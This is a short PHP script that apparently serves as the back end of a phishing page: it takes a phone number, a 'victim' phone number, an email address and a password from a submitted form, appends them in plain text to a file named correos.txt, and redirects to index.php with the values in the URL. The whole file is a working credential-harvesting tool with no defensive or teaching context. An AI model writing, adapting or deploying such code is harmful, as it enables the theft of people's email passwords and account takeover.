<?php
$phone = $_POST['phone'];
$phone_victima = $_POST['phone_victima'];
$email = $_POST['email'];
$password = $_POST['password'];
$mensaje = "Teléfono: ".$phone."   Email: ".$email."   Password: ".$password;

$file = fopen("correos.txt", "a");
fwrite($file, $mensaje. PHP_EOL);
fclose($file);

header("Location:index.php?finalizado=true&phone=$phone&phone_victima=$phone_victima&email=$email");
?>